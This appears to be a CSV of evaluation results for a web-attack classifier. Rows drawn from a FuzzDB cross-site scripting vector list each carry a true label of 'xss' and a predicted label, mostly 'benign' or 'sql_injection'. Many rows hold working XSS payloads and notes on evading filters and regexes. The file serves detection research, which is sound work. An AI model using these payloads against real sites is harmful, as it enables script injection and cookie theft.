id,payload,actual,predicted
fuzzdb_680,Author Name: kishor,xss,benign
fuzzdb_681,Basic JS breaker,xss,benign
fuzzdb_682,Exploit Name: Basic JS breaker,xss,benign
fuzzdb_683,Exploit String: xyz onerror=alert(6);,xss,benign
fuzzdb_684,Exploit Description: This vector just fits between script tags and fires an alerts.,xss,benign
fuzzdb_685,"Exploit Tags: general, JS breaking, basic",xss,benign
fuzzdb_686,Author Name: kishor,xss,benign
fuzzdb_687,Basic JS breaker variant 1,xss,benign
fuzzdb_688,Exploit Name: Basic JS breaker variant 1,xss,benign
fuzzdb_689,Exploit String: 1;a=eval;b=alert;a(b(/c/.source));,xss,benign
fuzzdb_690,Exploit Description: This vector breaks JS integer assignments.,xss,benign
fuzzdb_691,"Exploit Tags: general, JS breaking, basic, obfuscated",xss,benign
fuzzdb_692,Author Name: kishor,xss,benign
fuzzdb_693,Basic JS breaker variant 2,xss,benign
fuzzdb_694,Exploit Name: Basic JS breaker variant 2,xss,benign
fuzzdb_695,Exploit String: 1];a=eval;b=alert;a(b(17));//,xss,benign
fuzzdb_696,Exploit Description: This vector breaks JS integer assignments in arrays.,xss,benign
fuzzdb_697,"Exploit Tags: general, JS breaking, basic, obfuscated",xss,benign
fuzzdb_698,Author Name: kishor,xss,benign
fuzzdb_699,Basic JS breaker variant 3,xss,benign
fuzzdb_700,Exploit Name: Basic JS breaker variant 3,xss,benign
fuzzdb_701,Exploit String: ];a=eval;b=alert;a(b(16));//,xss,benign
fuzzdb_702,Exploit Description: This vector breaks JS when placed in double quoted arrays.,xss,benign
fuzzdb_703,"Exploit Tags: general, JS breaking",xss,benign
fuzzdb_704,Author Name: kishor,xss,benign
fuzzdb_705,Basic JS breaker variant 4,xss,benign
fuzzdb_706,Exploit Name: Basic JS breaker variant 4,xss,benign
fuzzdb_707,Exploit String: '];a=eval;b=alert;a(b(15));//,xss,benign
fuzzdb_708,Exploit Description: This vector breaks JS when embedded in single quoted arrays.,xss,benign
fuzzdb_709,"Exploit Tags: general, JS breaking, basic, obfuscated",xss,benign
fuzzdb_710,Author Name: kishor,xss,benign
fuzzdb_711,Basic JS breaker variant 5,xss,benign
fuzzdb_712,Exploit Name: Basic JS breaker variant 5,xss,benign
fuzzdb_713,Exploit String: 1};a=eval;b=alert;a(b(14));//,xss,benign
fuzzdb_714,Exploit Description: JS literal object breaker for integer properties.,xss,benign
fuzzdb_715,"Exploit Tags: general, JS breaking, basic, obfuscated",xss,benign
fuzzdb_716,Author Name: kishor,xss,benign
fuzzdb_717,Basic JS breaker variant 6,xss,benign
fuzzdb_718,Exploit Name: Basic JS breaker variant 6,xss,benign
fuzzdb_719,Exploit String: '};a=eval;b=alert;a(b(13));//,xss,benign
fuzzdb_720,Exploit Description: JS breaker for literal objects with single quoted string properties.,xss,benign
fuzzdb_721,"Exploit Tags: general, JS breaking, basic, obfuscated",xss,benign
fuzzdb_722,Author Name: kishor,xss,benign
fuzzdb_723,Basic JS breaker variant 7,xss,benign
fuzzdb_724,Exploit Name: Basic JS breaker variant 7,xss,benign
fuzzdb_725,Exploit String: };a=eval;b=alert;a(b(12));//,xss,benign
fuzzdb_726,Exploit Description: JS breaker for literal objects with double quoted string properties.,xss,benign
fuzzdb_727,"Exploit Tags: general, JS breaking",xss,benign
fuzzdb_728,Author Name: kishor,xss,benign
fuzzdb_729,Basic JS breaker variant 8,xss,benign
fuzzdb_730,Exploit Name: Basic JS breaker variant 8,xss,benign
fuzzdb_731,Exploit String: a=1;a=eval;b=alert;a(b(11));//,xss,benign
fuzzdb_732,Exploit Description: Can be used when JS can be injected directly.,xss,benign
fuzzdb_733,"Exploit Tags: general, JS breaking, basic, obfuscated",xss,benign
fuzzdb_734,Author Name: kishor,xss,benign
fuzzdb_735,Basic JS breaker variant 9,xss,benign
fuzzdb_736,Exploit Name: Basic JS breaker variant 9,xss,benign
fuzzdb_737,Exploit String: ;//%0da=eval;b=alert;a(b(10));//,xss,benign
fuzzdb_738,"Exploit Description: Breaks double quoted strings, injects a comment, carriage return and finally an alert.",xss,benign
fuzzdb_739,"Exploit Tags: general, JS breaking, CRLF",xss,benign
fuzzdb_740,Author Name: kishor,xss,benign
fuzzdb_741,Basic JS breaker variant 10,xss,benign
fuzzdb_742,Exploit Name: Basic JS breaker variant 10,xss,benign
fuzzdb_743,Exploit String: ';//%0da=eval;b=alert;a(b(9));//,xss,benign
fuzzdb_744,"Exploit Description: Breaks single quoted strings, injects a comment, carriage return and finally an alert.",xss,benign
fuzzdb_745,"Exploit Tags: general, JS breaking, basic, obfuscated, CRLF",xss,benign
fuzzdb_746,Author Name: kishor,xss,benign
fuzzdb_747,Basic single quoted attribute breaker,xss,benign
fuzzdb_748,Exploit Name: Basic single quoted attribute breaker,xss,benign
fuzzdb_750,Exploit Description: This vector breaks single quoted attributes and appends an alert.,xss,benign
fuzzdb_751,"Exploit Tags: general, html breaking, basic",xss,benign
fuzzdb_752,Author Name: kishor,xss,benign
fuzzdb_753,Basic title breaker,xss,benign
fuzzdb_754,Exploit Name: Basic title breaker,xss,benign
fuzzdb_756,Exploit Description: This basic vector breaks HTML titles and injects JavaScript.,xss,benign
fuzzdb_757,"Exploit Tags: general, html breaking, basic, title breaking",xss,benign
fuzzdb_758,Author Name: kishor,xss,benign
fuzzdb_759,BGSOUND,xss,benign
fuzzdb_760,Exploit Name: BGSOUND,xss,benign
fuzzdb_762,Exploit Description: BGSOUND,xss,benign
fuzzdb_763,"Exploit Tags: general, evil tags",xss,benign
fuzzdb_764,Author Name: ha.ckers.org,xss,benign
fuzzdb_765,BODY background-image,xss,benign
fuzzdb_766,Exploit Name: BODY background-image,xss,benign
fuzzdb_768,Exploit Description: BODY image,xss,benign
fuzzdb_769,"Exploit Tags: general, evil tags",xss,benign
fuzzdb_770,Author Name: ha.ckers.org,xss,benign
fuzzdb_771,BODY ONLOAD,xss,benign
fuzzdb_772,Exploit Name: BODY ONLOAD,xss,benign
fuzzdb_775,"Exploit Tags: general, evil tags",xss,benign
fuzzdb_776,Author Name: ha.ckers.org,xss,benign
fuzzdb_777,Camouflaged comment injection with JS link,xss,benign
fuzzdb_778,Exploit Name: Camouflaged comment injection with JS link,xss,benign
fuzzdb_779,Exploit String: <!--,xss,sql_injection
fuzzdb_780,"<A href=""",xss,benign
fuzzdb_781,- --><a href=javascript:alert:document.domain,xss,sql_injection
fuzzdb_782,>test-->,xss,sql_injection
fuzzdb_783,Exploit Description: This vector evades filters by camouflaging as a comment and inhabiting a JS link.,xss,benign
fuzzdb_784,"Exploit Tags: general, obfuscated, comment breaking, internet explorer",xss,benign
fuzzdb_785,Author Name: thespanner.co.uk,xss,benign
fuzzdb_786,Case Insensitive,xss,benign
fuzzdb_787,Exploit Name: Case Insensitive,xss,benign
fuzzdb_789,Exploit Description: Case insensitive XSS attack vector.,xss,benign
fuzzdb_790,"Exploit Tags: general, evil tags, obfuscated",xss,benign
fuzzdb_791,Author Name: ha.ckers.org,xss,benign
fuzzdb_792,Character Encoding Example,xss,benign
fuzzdb_793,Exploit Name: Character Encoding Example,xss,benign
fuzzdb_794,Exploit String: <%3C&lt&lt;&LT&LT;&#60&#060&#0060&#00060&#000060&#0000060&#60;&#060;&#0060;&#00060;&#000060;&#0000060;&#x3c&#x03c&#x003c&#x0003c&#x00003c&#x000003c&#x3c;&#x03c;&#x003c;&#x0003c;&#x00003c;&#x000003c;&#X3c&#X03c&#X003c&#X0003c&#X00003c&#X000003c&#X3c;&#X03c;&#X003c;&#X0003c;&#X00003c;&#X000003c;&#x3C&#x03C&#x003C&#x0003C&#x00003C&#x000003C&#x3C;&#x03C;&#x003C;&#x0003C;&#x00003C;&#x000003C;&#X3C&#X03C&#X003C&#X0003C&#X00003C&#X000003C&#X3C;&#X03C;&#X003C;&#X0003C;&#X00003C;&#X000003C;\x3c\x3C\u003c\u003C,xss,sql_injection
fuzzdb_795,"Exploit Description: All of the possible combinations of the character ”<” in HTML and JavaScript.  Most of these won't render, but many of them can get rendered in certain circumstances (standards are great, aren't they?).",xss,benign
fuzzdb_796,"Exploit Tags: general, evil tags, obfuscated",xss,benign
fuzzdb_797,Author Name: ha.ckers.org,xss,benign
fuzzdb_798,Closing JS Tag in JS String assignment,xss,benign
fuzzdb_799,Exploit Name: Closing JS Tag in JS String assignment,xss,benign
fuzzdb_800,Exploit String: <script>,xss,benign
fuzzdb_802,</script>,xss,benign
fuzzdb_803,"Exploit Description: For some reason, Firefox picks up the script closing tag in the quoted string and then proceeds to process the remaining script tags as code.",xss,benign
fuzzdb_804,"Exploit Tags: general, gecko, obfuscated, evil tags",xss,benign
fuzzdb_805,Author Name: t3rmin4t0r,xss,benign
fuzzdb_806,Commented-out Block,xss,benign
fuzzdb_807,Exploit Name: Commented-out Block,xss,benign
fuzzdb_808,Exploit String: <!--[if gte IE 4]><SCRIPT>alert('XSS');</SCRIPT><![endif]-->,xss,sql_injection
fuzzdb_809,"Exploit Description: Downlevel-Hidden block (only works in IE5.0 and later and Netscape 8.1 in IE rendering engine mode).  Some websites consider anything inside a comment block to be safe and therefore it does not need to be removed, which allows our XSS vector. Or the system could add comment tags around something to attempt to render it harmless.  As we can see, that probably wouldn't do the job.",xss,benign
fuzzdb_810,"Exploit Tags: general, obfuscated, conditional comments, internet explorer",xss,benign
fuzzdb_811,Author Name: ha.ckers.org,xss,benign
fuzzdb_812,Comment-breaker using obfuscated JavaScript,xss,benign
fuzzdb_813,Exploit Name: Comment-breaker using obfuscated JavaScript,xss,benign
fuzzdb_814,Exploit String: */a=eval;b=alert;a(b(/e/.source));/*,xss,benign
fuzzdb_815,Exploit Description: This vector creates an alert by breaking multiline comments.,xss,benign
fuzzdb_816,"Exploit Tags: general, comment breaking, JS breaking",xss,benign
fuzzdb_817,Author Name: kishor,xss,benign
fuzzdb_818,Conditional style injection for IE,xss,benign
fuzzdb_819,Exploit Name: Conditional style injection for IE,xss,benign
fuzzdb_820,Exploit String: width: expression((window.r==document.cookie)?'':alert(r=document.cookie)),xss,benign
fuzzdb_821,Exploit Description: This vector uses JavaScript conditional statements to inject an alert into CSS properties - it was once used as a PoC for a vulnerability in Stefan Di Paolos data binding example.,xss,benign
fuzzdb_822,"Exploit Tags: general, obfuscated, internet explorer, style injection",xss,benign
fuzzdb_823,Author Name: DoctorDan,xss,benign
fuzzdb_824,Content Replace,xss,benign
fuzzdb_825,Exploit Name: Content Replace,xss,benign
fuzzdb_826,"Exploit String: <A HREF=""http://www.gohttp://www.google.com/ogle.com/"">XSS</A>",xss,benign
fuzzdb_827,Exploit Description: Content replace as an attack vector (assuming ”http://www.google.com/” is programmatically replaced with null). I actually used a similar attack vector against a several separate real world XSS filters by using the conversion filter itself (like http://quickwired.com/kallahar/smallprojects/php_xss_filter_function.php) to help create the attack vector (”java&#x26;#x09;script:” was converted into ”java&#x09;script:”.,xss,sql_injection
fuzzdb_828,"Exploit Tags: general, evil tags, obfuscated",xss,benign
fuzzdb_829,Author Name: ha.ckers.org,xss,benign
fuzzdb_830,Cookie Manipulation,xss,benign
fuzzdb_831,Exploit Name: Cookie Manipulation,xss,benign
fuzzdb_833,"Exploit Description: Cookie manipulation - admittedly this is pretty obscure but I have seen a few examples where <META is allowed and you can user it to overwrite cookies. There are other examples of sites where instead of fetching the username from a database it is stored inside of a cookie to be displayed only to the user who visits the page. With these two scenarios combined you can modify the victim's cookie which will be displayed back to them as JavaScript (you can also use this to log people out or change their user states, get them to log in as you, etc).",xss,benign
fuzzdb_834,"Exploit Tags: general, evil tags",xss,benign
fuzzdb_835,Author Name: ha.ckers.org,xss,benign
fuzzdb_836,DIV background-image 1,xss,benign
fuzzdb_837,Exploit Name: DIV background-image 1,xss,benign
fuzzdb_839,Exploit Description: Div background-image,xss,benign
fuzzdb_840,"Exploit Tags: general, evil tags, style injection",xss,benign
fuzzdb_841,Author Name: ha.ckers.org,xss,benign
fuzzdb_842,DIV background-image 2,xss,benign
fuzzdb_843,Exploit Name: DIV background-image 2,xss,benign
fuzzdb_844,"Exploit String: <DIV STYLE=""background-image: url(&#1;javascript:alert('XSS'))"">",xss,sql_injection
fuzzdb_845,"Exploit Description: Div background-image plus extra characters.  I built a quick XSS fuzzer to detect any erroneous characters that are allowed after the open parenthesis but before the JavaScript directive in IE and Netscape 8.1 in secure site mode. These are in decimal but you can include hex and add padding of course.  (Any of the following chars can be used: 1-32, 34, 39, 160, 8192-8203, 12288, 65279)",xss,benign
fuzzdb_846,"Exploit Tags: general, evil tags, style injection",xss,benign
fuzzdb_847,Author Name: ha.ckers.org,xss,benign
fuzzdb_848,DIV expression,xss,benign
fuzzdb_849,Exploit Name: DIV expression,xss,benign
fuzzdb_850,"Exploit String: <DIV STYLE=""width: expression(alert('XSS'));"">",xss,benign
fuzzdb_851,Exploit Description: Div expression - a variant of this was effective against a real world cross site scripting filter using a newline between the colon and ”expression”,xss,benign
fuzzdb_852,"Exploit Tags: general, evil tags, style injection,  internet explorer",xss,benign
fuzzdb_853,Author Name: ha.ckers.org,xss,benign
fuzzdb_854,DIV w/Unicode,xss,benign
fuzzdb_855,Exploit Name: DIV w/Unicode,xss,benign
fuzzdb_856,"Exploit String: <DIV STYLE=""background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029"">",xss,benign
fuzzdb_857,Exploit Description: DIV background-image with unicoded XSS exploit (this has been modified slightly to obfuscate the url parameter).  The original vulnerability was found by Renaud Lifchitz (http://www.sysdream.com) as a vulnerability in Hotmail.,xss,benign
fuzzdb_858,"Exploit Tags: general, evil tags, obfuscated",xss,benign
fuzzdb_859,Author Name: ha.ckers.org,xss,benign
fuzzdb_860,Double open angle brackets,xss,benign
fuzzdb_861,Exploit Name: Double open angle brackets,xss,benign
fuzzdb_862,Exploit String: <IFRAME SRC=http://ha.ckers.org/scriptlet.html <,xss,benign
fuzzdb_863,"Exploit Description: This is an odd one that Steven Christey brought to my attention. At first I misclassified this as the same XSS vector as above but it's surprisingly different. Using an open angle bracket at the end of the vector instead of a close angle bracket causes different behavior in Netscape Gecko rendering. Without it, Firefox will work but Netscape won't",xss,benign
fuzzdb_864,"Exploit Tags: general, evil tags, injection, gecko",xss,benign
fuzzdb_865,Author Name: ha.ckers.org,xss,benign
fuzzdb_866,Dword Encoding,xss,benign
fuzzdb_867,Exploit Name: Dword Encoding,xss,benign
fuzzdb_868,"Exploit String: <A HREF=""http://1113982867/"">XSS</A>",xss,benign
fuzzdb_869,Exploit Description: URL string evasion (assuming ”http://www.google.com/” is programmatically disallowed).,xss,benign
fuzzdb_870,"Exploit Tags: general, evil tags, obfuscated",xss,benign
fuzzdb_871,Author Name: ha.ckers.org,xss,benign
fuzzdb_872,Embed Flash,xss,benign
fuzzdb_873,Exploit Name: Embed Flash,xss,benign
fuzzdb_875,Exploit Description: Using an EMBED tag you can embed a Flash movie that contains XSS. If you add the attributes allowScriptAccess=”never” and allownetworking=”internal” it can mitigate this risk (thank you to Jonathan Vanasco for the info). Demo: http://ha.ckers.org/weird/xssflash.html :,xss,benign
fuzzdb_876,"Exploit Tags: general, evil tags, obfuscated, injection",xss,benign
fuzzdb_877,Author Name: ha.ckers.org,xss,benign
fuzzdb_878,Embedded Carriage Return,xss,benign
fuzzdb_879,Exploit Name: Embedded Carriage Return,xss,benign
fuzzdb_880,"Exploit String: <IMG SRC=""jav&#x0D;ascript:alert('XSS');"">",xss,sql_injection
fuzzdb_881,Exploit Description: Embedded carriage return to break up XSS (Note: with the above I am making these strings longer than they have to be because the zeros could be omitted. Often I've seen filters that assume the hex and dec encoding has to be two or three characters. The real rule is 1-7 characters).,xss,benign
fuzzdb_882,"Exploit Tags: general, evil tags, obfuscated",xss,benign
fuzzdb_883,Author Name: ha.ckers.org,xss,benign
fuzzdb_884,Embedded Encoded Tab,xss,benign
fuzzdb_885,Exploit Name: Embedded Encoded Tab,xss,benign
fuzzdb_886,"Exploit String: <IMG SRC=""jav&#x09;ascript:alert('XSS');"">",xss,sql_injection
fuzzdb_887,"Exploit Description: Embedded encoded tab to break up XSS.  For some reason Opera does not allow the encoded tab, but it does allow the previous tab XSS and encoded newline and carriage returns below.",xss,benign
fuzzdb_888,"Exploit Tags: general, evil tags, obfuscated",xss,benign
fuzzdb_889,Author Name: ha.ckers.org,xss,benign
fuzzdb_890,Embedded Newline,xss,benign
fuzzdb_891,Exploit Name: Embedded Newline,xss,benign
fuzzdb_892,"Exploit String: <IMG SRC=""jav&#x0A;ascript:alert('XSS');"">",xss,sql_injection
fuzzdb_893,"Exploit Description: Embedded newline to break up XSS. Some websites claim that any of the chars 09-13 (decimal) will work for this attack. That is incorrect. Only 09 (horizontal tab), 10 (newline) and 13 (carriage return) work.",xss,benign
fuzzdb_894,"Exploit Tags: general, evil tags, obfuscated, internet explorer",xss,benign
fuzzdb_895,Author Name: ha.ckers.org,xss,benign
fuzzdb_896,Embedded Tab,xss,benign
fuzzdb_897,Exploit Name: Embedded Tab,xss,benign
fuzzdb_899,Exploit Description: Embedded tab to break up the cross site scripting attack.,xss,benign
fuzzdb_900,"Exploit Tags: general, evil tags, internet explorer",xss,benign
fuzzdb_901,Author Name: ha.ckers.org,xss,benign
fuzzdb_902,End title tag,xss,benign
fuzzdb_903,Exploit Name: End title tag,xss,benign
fuzzdb_905,"Exploit Description: This is a simple XSS vector that closes TITLE tags, which can encapsulate the malicious cross site scripting attack.",xss,benign
fuzzdb_906,"Exploit Tags: general, title breaking",xss,benign
fuzzdb_907,Author Name: ha.ckers.org,xss,benign
fuzzdb_908,Escaping JavaScript escapes,xss,benign
fuzzdb_909,Exploit Name: Escaping JavaScript escapes,xss,benign
fuzzdb_910,"Exploit String: \"";alert('XSS');//",xss,benign
fuzzdb_912,"Exploit Tags: general, JS breaking",xss,benign
fuzzdb_913,Author Name: ha.ckers.org,xss,benign
fuzzdb_914,Evade Regex Filter 1,xss,benign
fuzzdb_915,Exploit Name: Evade Regex Filter 1,xss,benign
fuzzdb_917,Exploit Description: For performing XSS on sites that allow ”<SCRIPT>” but don't allow ”<SCRIPT SRC...” by way of the following regex filter: /<script[^>]+src/i,xss,benign
fuzzdb_918,"Exploit Tags: general, evil tags, obfuscated, injection",xss,benign
fuzzdb_919,Author Name: ha.ckers.org,xss,benign
fuzzdb_920,Evade Regex Filter 2,xss,benign
fuzzdb_921,Exploit Name: Evade Regex Filter 2,xss,benign
fuzzdb_923,"Exploit Description: For performing XSS on sites that allow ”<SCRIPT>” but don't allow ”<SCRIPT SRC...” by way of a regex filter: /<script((\s+\w+(\s*=\s*(?:”(.)*?”|'(.)*?'|[^'”>\s]+))?)+\s*|\s*)src/i this is an important one, because I've seen this regex in the wild)",xss,benign
fuzzdb_924,"Exploit Tags: general, evil tags, obfuscated, injection",xss,benign
fuzzdb_925,Author Name: ha.ckers.org,xss,benign
fuzzdb_926,Evade Regex Filter 3,xss,benign
fuzzdb_927,Exploit Name: Evade Regex Filter 3,xss,benign
fuzzdb_929,Exploit Description: Another XSS to evade this regex filter: /<script((\s+\w+(\s*=\s*(?:”(.)*?”|'(.)*?'|[^'”>\s]+))?)+\s*|\s*)src/i,xss,benign
fuzzdb_930,"Exploit Tags: general, evil tags, obfuscated, injection",xss,benign
fuzzdb_931,Author Name: ha.ckers.org,xss,benign
fuzzdb_932,Evade Regex Filter 4,xss,benign
fuzzdb_933,Exploit Name: Evade Regex Filter 4,xss,benign
fuzzdb_935,Exploit Description: Yet another XSS to evade the same filter: /<script((\s+\w+(\s*=\s*(?:”(.)*?”|'(.)*?'|[^'”>\s]+))?)+\s*|\s*)src/i,xss,benign
fuzzdb_936,The only thing I've seen work against this XSS attack if you still want to allow <SCRIPT> tags but not remote scripts is a state machine (and of course there are other ways to get around this if they allow <SCRIPT> tags),xss,benign
fuzzdb_937,"Exploit Tags: general, evil tags, obfuscated, injection",xss,benign
fuzzdb_938,Author Name: ha.ckers.org,xss,benign
fuzzdb_939,Evade Regex Filter 5,xss,benign
fuzzdb_940,Exploit Name: Evade Regex Filter 5,xss,benign
fuzzdb_942,Exploit Description: And one last XSS attack (using grave accents) to evade this regex: /<script((\s+\w+(\s*=\s*(?:”(.)*?”|'(.)*?'|[^'”>\s]+))?)+\s*|\s*)src/i,xss,benign
